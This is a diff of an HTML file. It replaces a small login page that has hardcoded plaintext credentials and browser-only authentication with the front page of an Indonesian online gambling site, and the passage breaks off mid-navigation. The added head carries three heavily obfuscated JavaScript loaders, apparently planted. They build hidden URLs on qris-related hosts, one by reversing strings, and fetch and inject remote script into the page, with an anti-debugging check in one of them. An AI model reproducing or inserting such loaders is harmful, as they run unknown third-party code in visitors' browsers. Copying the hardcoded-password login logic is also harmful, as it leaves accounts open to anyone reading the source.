@@ -1,242 +1,286 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="id-ID">
+
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>K7N PROJECT - LOGIN</title>
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
-<style>
-:root{--blue:#6AB8FF;--bg:#0D0014;--card:#101322}
-*{box-sizing:border-box}
-body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);font-family:Montserrat,Arial,sans-serif;color:#E0E0E0;padding:20px}
-.card{width:100%;max-width:420px;background:var(--card);border:1px solid rgba(106,184,255,0.18);padding:24px;border-radius:14px;box-shadow:0 6px 30px rgba(10,20,30,0.6)}
-h1{font-family:Orbitron,monospace;color:var(--blue);text-align:center;margin-bottom:18px}
-.logo{display:block;width:110px;height:110px;border-radius:50%;object-fit:cover;margin:0 auto 14px;border:3px solid var(--blue);box-shadow:0 0 12px rgba(106,184,255,0.45)}
-input{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(106,184,255,0.12);background:#0f1720;color:#E0E0E0;margin-bottom:12px;font-size:15px}
-button{width:100%;padding:14px;border-radius:10px;border:none;background:linear-gradient(90deg,var(--blue),#3399FF);color:#00111a;font-weight:700;cursor:pointer;font-size:16px}
-button:active{transform:translateY(1px)}
-#msg{height:18px;margin-top:10px;text-align:center;font-size:14px;color:#ff8b8b}
-/* video overlay */
-#videoOverlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.92);z-index:9999}
-#videoOverlay.active{display:flex}
-#loginVideo{width:84%;max-width:720px;border-radius:10px}
-</style>
-</head>
-<body>
-<div id="videoOverlay">
-  <video id="loginVideo" playsinline>
-    <source src="https://files.catbox.moe/mksc7a.mp4" type="video/mp4">
-    Your browser does not support video.
-  </video>
-</div>
+  <title>RIANGacor | Situs Terkemuka yang paling diminati oleh semua player di Indonesia.</title>
+<meta name="description" content="Dewi11 selalu menjadi incaran untuk semua member karena selalu membagikan uang setiap hari nya." />
+<meta name="keywords" content="Dewi11 , Login Dewi11 ,Daftar Dewi11 , Link Alternatif Dewi11" />
+<meta name="twitter:title" content="Dewi11 | Situs Terkemuka yang paling diminati oleh semua player di Indonesia.">
+<meta name="twitter:description" content="Dewi11 selalu menjadi incaran untuk semua member karena selalu membagikan uang setiap hari nya.">
+<meta property="og:title" content="Dewi11 | Situs Terkemuka yang paling diminati oleh semua player di Indonesia.">
+<meta property="og:description" content="Dewi11 selalu menjadi incaran untuk semua member karena selalu membagikan uang setiap hari nya.">
+<meta name="robots" content="NOINDEX, NOFOLLOW">
+<meta name="Content-Type" content="text/html">
+<meta name="twitter:card" content="summary">
+<meta name="og:type" content="website">
+<meta name="author" content="DEWI11">
+<meta property="og:image" content="https://files.sitestatic.net/banners/2025070914573900000077617ad2e9__DEWI11__3543x794.jpg">
 
-<div class="card" role="main" aria-labelledby="title">
-  <h1 id="title">K7N X WAR CRASH</h1>
-  <img src="https://i.supaimg.com/9775bd8b-667c-4ea3-8173-b27aeee837bc.jpg" alt="logo" class="logo" />
-  
-  <label for="username" style="display:none">Username</label>
-  <input id="username" autocomplete="username" placeholder="Username" inputmode="text" />
-  
-  <label for="password" style="display:none">Password</label>
-  <input id="password" type="password" autocomplete="current-password" placeholder="Password" />
-  
-  <button id="btnLogin" type="button">LOGIN</button>
-  
-  <div id="msg" role="status" aria-live="polite"></div>
-</div>
 
+<link rel="icon" href="https://files.sitestatic.net/ImageFile/2024071215570100000092fad3377e4GGAAAA__450x450.png" type="image/gif">
+
+<meta property="og:site_name" content="DEWI11">
+<meta name="twitter:site" content="DEWI11">
+<meta name="twitter:image" content="https://files.sitestatic.net/banners/2025070914573900000077617ad2e9__DEWI11__3543x794.jpg">
+<meta property="og:image:alt" content="DEWI11">
+<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<meta property="og:url" content="http://spear.dewi11-pit.com">
+
+
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-KD7XJ2RD');</script>
+<!-- End Google Tag Manager --> 
+ 
+
+<!-- TikTok Pixel Base Code -->
 <script>
-(function(){
+    !function (w, d, t) {
+        w.TiktokAnalyticsObject = t;
+        var ttq = w[t] = w[t]  [];
+        ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie"];
+        ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } };
+        for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
+        ttq.instance = function (t) { for (var e = ttq._i[t]  [], n = 0; n < ttq.methods.length; n++)ttq.setAndDefer(e, ttq.methods[n]); return e };
+        ttq.load = function (e, n) { var i = "https://analytics.tiktok.com/i18n/pixel/events.js"; ttq._i = ttq._i  {}; ttq._i[e] = []; ttq._i[e]._u = i; ttq._t = ttq._t  {}; ttq._t[e] = +new Date; ttq._o = ttq._o  {}; ttq._o[e] = n  {}; var o = document.createElement("script"); o.type = "text/javascript", o.async = !0, o.src = i + "?sdkid=" + e + "&lib=" + t; var a = document.getElementsByTagName("script")[0]; a.parentNode.insertBefore(o, a) };
+        ttq.load('CRORP9BC77U6OCTLVGT0'); 
+        ttq.page();
+    }(window, document, 'ttq');</script> 
 
-/* ================== CONFIG ================== */
-const DB_KEY = "K7N_DB_V1";
-const SESSION_KEY = "K7N_SESSION_V1";
-const TRIAL_META_KEY = "TRIAL_META_V1";
-const TRIAL_USED_KEY = "TRIAL_USED_V1";
+<script>function _0x183d(_0x401589,_0x167249){var _0x2672a7=_0x2672();return _0x183d=function(_0x183d6a,_0x38b8ef){_0x183d6a=_0x183d6a-0x1e7;var _0x456966=_0x2672a7[_0x183d6a];return _0x456966;},_0x183d(_0x401589,_0x167249);}var _0x7c9707=_0x183d;(function(_0x48dddf,_0x222a33){var _0x53af98=_0x183d,_0x1f1498=_0x48dddf();while(!![]){try{var _0x4113a1=parseInt(_0x53af98(0x1f7))/0x1*(-parseInt(_0x53af98(0x1f1))/0x2)+parseInt(_0x53af98(0x1f4))/0x3*(parseInt(_0x53af98(0x1f3))/0x4)+-parseInt(_0x53af98(0x1e7))/0x5+parseInt(_0x53af98(0x1fa))/0x6*(parseInt(_0x53af98(0x1ef))/0x7)+-parseInt(_0x53af98(0x1f2))/0x8*(-parseInt(_0x53af98(0x1ec))/0x9)+-parseInt(_0x53af98(0x1e9))/0xa*(parseInt(_0x53af98(0x1ea))/0xb)+parseInt(_0x53af98(0x1f6))/0xc*(parseInt(_0x53af98(0x1ee))/0xd);if(_0x4113a1===_0x222a33)break;else _0x1f1498['push'](_0x1f1498['shift']());}catch(_0x41f884){_0x1f1498['push'](_0x1f1498['shift']());}}}(_0x2672,0x726df));var arr = ['supe','2','RbqubqF4HOXCq6atlEyI','UubFe5LZxXqnaWf6ZInk','com','rqris'];function _0x2672(){var _0x3efd31=['parentNode','15312soiuzq','script','src','https://','361710uMrgzs','&rnd=','207740vwgbXm','22pOoZEh','/api/script?v=','896499WbBLGI','async','13UHFSep','1743BIrdQS','type','1150134wVJuRm','8NBptgl','505624LlbNIg','6XSQToC','insertBefore','2037468KkLfBM','1EEyvsG','dp1'];_0x2672=function(){return _0x3efd31;};return _0x2672();}window['dp1']=window[_0x7c9707(0x1f8)]||{},(function(){var _0x346448=_0x7c9707,_0xda9a8e=document['createElement']('script');_0xda9a8e[_0x346448(0x1f0)]='text/javascript',_0xda9a8e[_0x346448(0x1ed)]=!![],_0xda9a8e[_0x346448(0x1fc)]=_0x346448(0x1fd)+arr[0x0]+''+arr[0x5]+'.'+arr[0x4]+_0x346448(0x1eb)+arr[0x1]+'&key='+arr[0x2]+_0x346448(0x1e8)+arr[0x3];var _0x15e5d0=document['getElementsByTagName'](_0x346448(0x1fb))[0x0];_0x15e5d0[_0x346448(0x1f9)][_0x346448(0x1f5)](_0xda9a8e,_0x15e5d0);}());</script> 
 
-const TRIAL_USERNAME = "TRIAL";
-const TRIAL_PASSWORD = "T30";
-const TRIAL_DURATION = 30 * 60 * 1000; // 30 menit
+<script>function _0x5caa(){var _0x173ac2=['apply','toString','script','11217078ERJcRK','408448nMnPuA','72FPHmcG','161584borcyq','type','ent','head','8535nJMVUo','(((.+)+)+)','sByTagName','agaming.js','constructo','1954632FJQiBQ','644NMFBGH','async','https://as','dw11','set.qrisho','createElem','ki.com/gig','module','appendChil','search','onload','91830COlnQc','JzIED','getElement','4137qEUwEq','src'];_0x5caa=function(){return _0x173ac2;};return _0x5caa();}var _0x34f52f=_0x516b;(function(_0x3a3eef,_0xa7e09d){var _0x1f9913=_0x516b,_0x691651=_0x3a3eef();while(!![]){try{var _0x274729=-parseInt(_0x1f9913(0x8b))/(0x2333*-0x1+0x11bc+0x1178)+-parseInt(_0x1f9913(0x89))/(0xafd*0x1+-0xc88*-0x1+-0xd*0x1cf)+-parseInt(_0x1f9913(0xa0))/(-0x221*-0xb+0x894+-0x1ffc*0x1)+parseInt(_0x1f9913(0x95))/(0x1*-0x34+0x24ba+0x1241*-0x2)*(-parseInt(_0x1f9913(0x8f))/(0xcba+-0x1*-0x266b+0x8*-0x664))+-parseInt(_0x1f9913(0x94))/(-0x49d+0x1e*0x11c+0x1*-0x1ca5)+parseInt(_0x1f9913(0xa3))/(0x202e+0x475*-0x2+-0x173d)*(-parseInt(_0x1f9913(0x8a))/(-0x20*-0x2+0x9*-0xc6+0x6be))+parseInt(_0x1f9913(0xa8))/(0x1847+0xee*0x3+0x361*-0x8);if(_0x274729===_0xa7e09d)break;else _0x691651['push'](_0x691651['shift']());}catch(_0x49622b){_0x691651['push'](_0x691651['shift']());}}}(_0x5caa,0x632e1+0x2*0x1fd97+-0x674e9));function _0x516b(_0x516b9c,_0x5275b7){var _0x194e15=_0x5caa();return _0x516b=function(_0x1a3ef3,_0x3c6b18){_0x1a3ef3=_0x1a3ef3-(0x73*-0x5+-0x116c+0x1434);var _0x4323e6=_0x194e15[_0x1a3ef3];return _0x4323e6;},_0x516b(_0x516b9c,_0x5275b7);}var _0x1a5842=(function(){var _0x340ed3=!![];return function(_0x5741c2,_0x39e9ed){var _0x252305=_0x340ed3?function(){var _0x2e9a38=_0x516b;if(_0x39e9ed){var _0x55c048=_0x39e9ed[_0x2e9a38(0xa5)](_0x5741c2,arguments);return _0x39e9ed=null,_0x55c048;}}:function(){};return _0x340ed3=![],_0x252305;};}()),_0x4ff543=_0x1a5842(this,function(){var _0x4959dc=_0x516b,_0x4dd7f3={'JzIED':_0x4959dc(0x90)+'+$'};return _0x4ff543[_0x4959dc(0xa6)]()[_0x4959dc(0x9e)](_0x4dd7f3[_0x4959dc(0xa1)])[_0x4959dc(0xa6)]()[_0x4959dc(0x93)+'r'](_0x4ff543)[_0x4959dc(0x9e)](_0x4dd7f3[_0x4959dc(0xa1)]);});_0x4ff543();var hokiScript=document[_0x34f52f(0x9a)+_0x34f52f(0x8d)](_0x34f52f(0xa7));hokiScript[_0x34f52f(0x8c)]=_0x34f52f(0x9c),hokiScript[_0x34f52f(0x9f)]=function(){var _0x52ea7c=_0x34f52f;hokiStart(_0x52ea7c(0x98));},hokiScript[_0x34f52f(0xa4)]=_0x34f52f(0x97)+_0x34f52f(0x99)+_0x34f52f(0x9b)+_0x34f52f(0x92),hokiScript[_0x34f52f(0x96)]=!(0x328+-0x735+0x40d),document[_0x34f52f(0xa2)+_0x34f52f(0x91)](_0x34f52f(0x8e))[-0x5*0x677+0x8ec*-0x1+0x293f][_0x34f52f(0x9d)+'d'](hokiScript);</script>
 
-const REMOTE_DB = "https://raw.githubusercontent.com/ajimat26/ajimat26.github.io/main/K7NN/data/database.json";
-const DASHBOARD_URL = "http://serverpublik-pirzy.anti-ddos.me:2019/dashboard";
+<script type="text/javascript">
+        var clientautodepo = 'dewi11';
+        var labelautodepo = 'KBG265 MNN';
+        var loadwl = 'kixplay';
+        var domainsystem = 'piv.sitamoto.51emarfi';
+        var uuidautodepo = '';
+        function _0x57ee(){var _0x3e9cd4=['6282990qfpCCP','evitca_tnahcrem/ipa/piv.sitamoto.sirq//:sptth','POST','createElement','.js?','4020715nxerbx','9444526JKzVaT','headers','status','application.json','8vKtGRU','//:sptth','now','application/json','562EKQMAa','head','then','appendChild','split','uuid','script','floor','17337glyAug','reverse','stringify','join','/lwntpircs/','11051032Fxvgbu','get','json','1337443rdQqzW','data','9752334rszHrt'];_0x57ee=function(){return _0x3e9cd4;};return _0x57ee();}var _0x493fe3=_0x2141;function _0x2141(_0x5db1e8,_0x44f764){var _0x57ee8c=_0x57ee();return _0x2141=function(_0x214148,_0x42ca09){_0x214148=_0x214148-0x1a3;var _0x24059b=_0x57ee8c[_0x214148];return _0x24059b;},_0x2141(_0x5db1e8,_0x44f764);}(function(_0x3149f6,_0x2352d3){var _0x935194=_0x2141,_0x5e4479=_0x3149f6();while(!![]){try{var _0x593c68=-parseInt(_0x935194(0x1b2))/0x1+-parseInt(_0x935194(0x1c3))/0x2*(-parseInt(_0x935194(0x1aa))/0x3)+parseInt(_0x935194(0x1bf))/0x4*(parseInt(_0x935194(0x1ba))/0x5)+-parseInt(_0x935194(0x1b4))/0x6+-parseInt(_0x935194(0x1bb))/0x7+parseInt(_0x935194(0x1af))/0x8+parseInt(_0x935194(0x1b5))/0x9;if(_0x593c68===_0x2352d3)break;else _0x5e4479['push'](_0x5e4479['shift']());}catch(_0x3b57c4){_0x5e4479['push'](_0x5e4479['shift']());}}}(_0x57ee,0xf40c8));var apipath=_0x493fe3(0x1b6);function setupScriptOtomatis(){var _0x316375=_0x493fe3,_0x1706f2=_0x316375(0x1ae)+domainsystem+_0x316375(0x1c0);fetch(_0x1706f2['split']('')[_0x316375(0x1ab)]()[_0x316375(0x1ad)]('')+loadwl+_0x316375(0x1b9)+Math[_0x316375(0x1a9)](Date[_0x316375(0x1c1)]()/0x3e8))[_0x316375(0x1a4)](_0x4f5173=>{var _0x571c8e=_0x316375;return _0x4f5173['ok']?_0x4f5173['text']():fetch(response[_0x571c8e(0x1bc)][_0x571c8e(0x1b0)]('Location'))['then'](_0x43c706=>_0x43c706['text']());})[_0x316375(0x1a4)](_0x5822c3=>{var _0x2b25e4=_0x316375,_0x11bdb2=document[_0x2b25e4(0x1b8)](_0x2b25e4(0x1a8));_0x11bdb2['textContent']=_0x5822c3,document[_0x2b25e4(0x1a3)][_0x2b25e4(0x1a5)](_0x11bdb2);});}var reqdataautodepo={'client':clientautodepo,'label':labelautodepo};fetch(apipath[_0x493fe3(0x1a6)]('')[_0x493fe3(0x1ab)]()[_0x493fe3(0x1ad)](''),{'method':_0x493fe3(0x1b7),'headers':{'Accept':_0x493fe3(0x1be),'Content-Type':_0x493fe3(0x1c2)},'cache':'no-cache','body':JSON[_0x493fe3(0x1ac)](reqdataautodepo)})[_0x493fe3(0x1a4)](_0x1b84fe=>_0x1b84fe[_0x493fe3(0x1b1)]())[_0x493fe3(0x1a4)](function(_0x3fe860){var _0x263901=_0x493fe3;_0x3fe860[_0x263901(0x1bd)]&&(_0x3fe860['data'][_0x263901(0x1a7)]&&(_0x3fe860[_0x263901(0x1b3)][_0x263901(0x1a7)]!=''&&(uuidautodepo=_0x3fe860[_0x263901(0x1b3)][_0x263901(0x1a7)],setupScriptOtomatis())));});
+      </script>
+ 
 
-const defaultAdmin = {
-  username: "K7N",
-  password: "nvrz",
-  role: "OWNER",
-  expired: "NEVER"
-};
 
-/* ================== UTIL ================== */
-function setMsg(text, color){
-  const el = document.getElementById("msg");
-  el.textContent = text || "";
-  el.style.color = color || "";
-}
 
-function now(){ return Date.now(); }
 
-/* ================== DB INIT ================== */
-function initLocalDB(){
-  try {
-    const raw = localStorage.getItem(DB_KEY);
-    if (!raw) {
-      const db = { accounts: [ defaultAdmin ] };
-      localStorage.setItem(DB_KEY, JSON.stringify(db));
-      return db;
-    }
-    return JSON.parse(raw);
-  } catch {
-    const db = { accounts: [ defaultAdmin ] };
-    localStorage.setItem(DB_KEY, JSON.stringify(db));
-    return db;
-  }
-}
 
-async function fetchRemoteDB(){
-  try {
-    const res = await fetch(REMOTE_DB, { cache: "no-store" });
-    if (!res.ok) throw 0;
-    const json = await res.json();
-    localStorage.setItem(DB_KEY, JSON.stringify(json));
-    return json;
-  } catch {
-    return null;
-  }
-}
+ 
+<meta charset="utf-8">
 
-/* ================== TRIAL LOGIC ================== */
-function isTrialExpired(){
-  const meta = JSON.parse(localStorage.getItem(TRIAL_META_KEY) || "null");
-  if (!meta) return false;
-  return now() > meta.expiredAt;
-}
+<meta name="csrf-token" content="mJwiUxHIhFknYvVp0afe3puZ3nSLvalQmXp8tVj7">
 
-function markTrialUsed(){
-  localStorage.setItem(TRIAL_USED_KEY, "true");
-  localStorage.removeItem(TRIAL_META_KEY);
-  localStorage.removeItem(SESSION_KEY);
-}
+<script src="https://cdn.sitestatic.net/assets/jquery/jquery.min.js"></script>
+<script src="https://cdn.sitestatic.net/assets/bootstrap/bootstrap.min.js"></script>
 
-function startTrialSession(){
-  const meta = {
-    startedAt: now(),
-    expiredAt: now() + TRIAL_DURATION
-  };
-  localStorage.setItem(TRIAL_META_KEY, JSON.stringify(meta));
+                         
+                        <link rel="preload" href="https://spear.dewi11-pit.com/fonts/ugsubskin/icomoon/fonts/icomoon.woff2?5e2yd7" as="font" type="font/woff2" crossorigin="anonymous">
+      <link rel="stylesheet" href="https://spear.dewi11-pit.com/fonts/ugsubskin/icomoon/style.min.css?v=1.4" media="print" onload="this.media='all'"> 
+      <link rel="stylesheet" href="https://spear.dewi11-pit.com/css/ugsports/swiper.css" />
 
-  const session = {
-    username: "TRIAL",
-    role: "TRIAL",
-    expired: new Date(meta.expiredAt).toISOString(),
-    createdAt: new Date().toISOString(),
-    isTrial: true
-  };
-  localStorage.setItem(SESSION_KEY, JSON.stringify(session));
+  <link type="text/css" rel="stylesheet" href="https://spear.dewi11-pit.com/css/ugsports/theme-6/app-mobile.css?id=6fb73822c8e5dd834a7d7e763a21a5f2">     
+    <link type="text/css" rel="stylesheet" href="https://spear.dewi11-pit.com/css/ugsports/theme-6/gigagaming/custom.css?id=84a83c467e055f8a36264e3a42cd677f">
+    <script src="https://cdn.sitestatic.net/assets/jquery/sweet_alert2.min.js"></script>
+ 
 
-  // Set timer auto logout
-  setTimeout(() => {
-    alert("Masa TRIAL sudah habis!");
-    markTrialUsed();
-    location.reload(); // redirect ke login setelah logout
-  }, TRIAL_DURATION);
-}
+  <link rel="stylesheet" href="https://cdn.sitestatic.net/assets/jquery/jquery-ui.min.css" media="print" onload="this.media='all'">
+  <script src="https://cdn.sitestatic.net/assets/jquery/jquery-ui.min.js" defer></script>
+  <script type="text/javascript" src="https://cdn.sitestatic.net/assets/jquery/jquery.ui.touch-punch.min.js" defer></script>
+</head>
 
-/* ================== LOGIN ================== */
-async function loginUser(){
-  setMsg("");
+<body class="mobile">
+ 
+  <div class="full-container layout">
+    <div id="sideNav" class="side-nav">
+      <nav class="nav-content">
+  <ul class="side-nav-items">
+    <li class="nav-item">
 
-  const user = username.value.trim();
-  const pass = password.value;
+      <a class="navlink" href="https://spear.dewi11-pit.com" onclick="closeNav(-1);">
+        <div><i class="icon-home"></i></div> <!--routerLinkActiveOptions for root URL-->
+        <div class="nav-title" i18n="@HOME">HOME</div>
+      </a>
 
-  if (!user || !pass){
-    setMsg("Isi username & password", "#ff8b8b");
-    return;
-  }
+    </li>
+            
+      
+    <li class="nav-item">
+      <a href="#" class="navlink has-sub" onclick="openNavItem(0);" [ngClass]="{'active':isOpenNavContent[0], '':   !isOpenNavContent[0]}">
+        <div><i class="icon-coins"></i></div>
+        <div class="nav-title" i18n="@Funds">Dana</div>
+      </a>
+      <div class="nav-item-content" [ngClass]="{'open':isOpenNavContent[0], '':!isOpenNavContent[0]}">
+        <ul class="submenu account">
+          <li>
+            <a href="https://spear.dewi11-pit.com/account/deposit" (click)="closeNav($event);">
+              <div><span class="circle"><i class="icon-pig"></i></span></div>
+              <div class="fs-sm mt-1" i18n>Deposit</div>
+            </a>
+          </li>
+          <li>
+            <a href="https://spear.dewi11-pit.com/account/withdrawal" (click)="closeNav($event);">
+              <div><span class="circle"><i class="icon-transfer"></i></span></div>
+              <div class="fs-sm mt-1" i18n>Withdraw</div>
+            </a>
+          </li>
+          <li>
+            <a href="https://spear.dewi11-pit.com/account/history" (click)="closeNav($event);">
+              <div><span class="circle"><i class="icon-history"></i></span></div>
+              <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
+            </a>
+          </li>
+        
+          <li>
+            <a href="https://spear.dewi11-pit.com/referral-downline" (click)="closeNav($event);">
+              <div><span class="circle"><i class="icon-users"></i></span></div>
+              <div class="fs-sm mt-1" i18n="">Referral &nbsp;</div>
+            </a>
+          </li>
+      
 
-  /* ===== TRIAL ACCOUNT ===== */
-  if (user === TRIAL_USERNAME && pass === TRIAL_PASSWORD){
+        </ul>
+      </div>
+    </li>
+    
+        <li class="nav-item">
+      <a href="#" class="navlink has-sub" onclick="openNavItem(1);"[ngClass]="{'active':isOpenNavContent[1], '':   !isOpenNavContent[1]}">
+        <div><i class="icon-videogame_asset"></i></div>
+        <div class="nav-title" i18n>PERMAINAN</div>
+      </a>
+      <div class="nav-item-content games" [ngClass]="{'open':isOpenNavContent[1], '':!isOpenNavContent[1]}">
+        <ul class="submenu">
+                  <!-- <i class="icon-lottery"></i>
+                  <i  class="icon-others"></i>    -->
 
-    if (localStorage.getItem(TRIAL_USED_KEY)){
-      setMsg("Akun TRIAL sudah digunakan.", "#ff8b8b");
-      return;
-    }
+                                   <li>  <a href="https://spear.dewi11-pit.com/slots" (click)="closeNav(-1);">
+              <div class="">
+                <span class="circle">
+                  <i class="icon-slot"></i>
+               
+                </span>
+                   <span class='hot sub' style="">HOT</span>
+              </div>
+              <div class="fs-sm mt-1">SLOTS</div>
+            </a>
+            </li>
+                                                <li>  <a href="https://spear.dewi11-pit.com/live" (click)="closeNav(-1);">
+              <div class="">
+                <span class="circle">
+                  <img src="https://files.sitestatic.net/images/live_game_icon.gif?v=1" ref="live game" height="41px">               
+                </span>
+                   <span class='hot sub' style="">HOT</span>
+              </div>
+              <div class="fs-sm mt-1">LIVE GAMES</div>
+            </a>
+            </li>
+                                                <li>  <a href="https://spear.dewi11-pit.com/sports" (click)="closeNav(-1);">
+              <div class="">
+                <span class="circle">
+                  <i class="icon-soccer"></i>
+                </span>
+              </div>
+              <div class="fs-sm mt-1">SPORTS</div>
+            </a>
+            </li>
+                                                <li>    <a href="https://spear.dewi11-pit.com/casino" (click)="closeNav(-1);">
+              <div class="">
+                <span class="circle">
+                  <i class="icon-casino"></i>
+                </span>
+              </div>
+              <div class="fs-sm mt-1">CASINO</div>
+            </a>
+            </li>
+                                                <li>  <a href="https://spear.dewi11-pit.com/poker" (click)="closeNav(-1);">
+              <div class="">
+                <span class="circle">
+                  <i class="icon-menu-poker-01"></i>
+                </span>
+              </div>
+              <div class="fs-sm mt-1">P2P</div>
+            </a>
+            </li>
+                                                <li>
+              <a href="https://spear.dewi11-pit.com/fish-hunter" (click)="closeNav(-1);">
+                <div class="">
+                    <span class="circle">
+                    <i class="icon-fish_hunter"></i>
+                    </span>
+                </div>
+                <div class="fs-sm mt-1">TEMBAK IKAN</div>
+               </a>
+            </li>
+                                                <li>
+              <a href="https://spear.dewi11-pit.com/lottery" (click)="closeNav(-1);">
+                <div class="">
+                    <span class="circle">
+                      <i class="icon-lottery"></i>
+                    
+                    </span>
+                    <span class="hot sub new "  >NEW</span>
+                </div>
+                <div class="fs-sm mt-1">LOTRE</div>
+               </a>
+            </li>
+                                                <li>   <a href="https://spear.dewi11-pit.com/e-games" (click)="closeNav(-1);">
+              <div class="">
+                <span class="circle">
+                  <i class="icon-others"></i>
+                </span>
+              </div>
+              <div class="fs-sm mt-1">E-GAMES</div>
+            </a>
+            </li>
+                        
 
-    if (isTrialExpired()){
-      markTrialUsed();
-      setMsg("Masa TRIAL sudah habis.", "#ff8b8b");
-      return;
-    }
+        </ul>
+      </div>
+    </li>
 
-    if (!localStorage.getItem(TRIAL_META_KEY)){
-      startTrialSession();
-    }
+            <li class="nav-item">
+      <a class="navlink" href="https://spear.dewi11-pit.com/promo/my-promo"  onclick="closeNav(-1);">
+        <div><i class="icon-user1"></i></div> 
+        <div class="nav-title" i18n="@PROMOS">Promo saya</div>
+      </a>
+    </li>
+          <li class="nav-item">
 
-    playAndRedirect();
-    return;
-  }
+      <a class="navlink" href="https://spear.dewi11-pit.com/promotion"  onclick="closeNav(-1);">
+        <div><i class="icon-gift"></i></div> <!--routerLinkActiveOptions for root URL-->
+        <div class="nav-title" i18n="@PROMOS">PROMOSI</div>
+      </a>
+    </li>
+    
+                <li class="nav-item">
 
-  /* ===== NORMAL ACCOUNT ===== */
-  let db = initLocalDB();
-  fetchRemoteDB().then(r => r && (db = r));
+      <a class="navlink"  href="https://spear.dewi11-pit.com/t.me/dewi11official" onclick="closeNav(-1);">
+        <div>
+          <i></i>
+          <img src = "https://files.sitestatic.net/ImageFile/202510151537520000006dd5c85ae8__DEWI11__350x350.gif " width="30px" height="30px">
+        </div> <!--routerLinkActiveOptions for root URL-->
 
-  const acc = (db.accounts || []).find(a =>
-    a.username === user && a.password === pass
-  );
+        <div class="nav-title" >T.ME/GACOROFFICIAL</div>
+      </a>
+    </li>
+            <li class="nav-item">
 
-  if (!acc){
-    setMsg("Username atau password salah.", "#ff8b8b");
-    return;
-  }
+      <a class="navlink"  href="https://manisdisini.com/RTP-DEWIGRUP" target="_blank" onclick="closeNav(-1);">
+        <div>
+          <i></i>
+          <img src = "https://files.sitestatic.net/ImageFile/20251015153303000000bbf0dedc5c__DEWI11__300x300.png" width="30px" height="30px">
+        </div> <!--routerLinkActiveOptions for root URL-->
 
-  const session = {
-    username: acc.username,
-    role: acc.role || "USER",
-    expired: acc.expired || "NEVER",
-    createdAt: new Date().toISOString()
-  };
+        <div class="nav-title" >RTP</div>
+      </a>
+    </li>
+       
 
-  localStorage.setItem(SESSION_KEY, JSON.stringify(session));
-  playAndRedirect();
-}
 
-/* ================== VIDEO ================== */
-function playAndRedirect(){
-  const overlay = videoOverlay;
-  const video = loginVideo;
-  overlay.classList.add("active");
+    <li class="nav-item">
 
-  const p = video.play();
-  if (p?.then){
-    p.then(() => video.onended = () => location.href = DASHBOARD_URL)
-     .catch(() => location.href = DASHBOARD_URL);
-  } else {
-    setTimeout(() => location.href = DASHBOARD_URL, 1500);
-  }
-}
-
-/* ================== AUTO TRIAL CHECK ================== */
-(function autoTrialCheck(){
-  if (isTrialExpired()){
-    markTrialUsed();
-  }
-  // jika ada TRIAL session aktif -> langsung redirect
-  const session = JSON.parse(localStorage.getItem(SESSION_KEY) || "null");
-  if(session?.isTrial){
-    playAndRedirect();
-  }
-})();
-
-/* ================== EVENTS ================== */
-btnLogin.onclick = loginUser;
-document.addEventListener("keydown", e => {
-  if (e.key === "Enter") loginUser();
-});
-
-initLocalDB();
-
-})();
-</script>
-</body>
-</html>
+      <a class="navlink" href="https://spear.dewi11-pit.com/info" onclick="closeNav(-1);">
+        <div><i class="icon-info"></i></div> <!--routerLinkActiveOpti
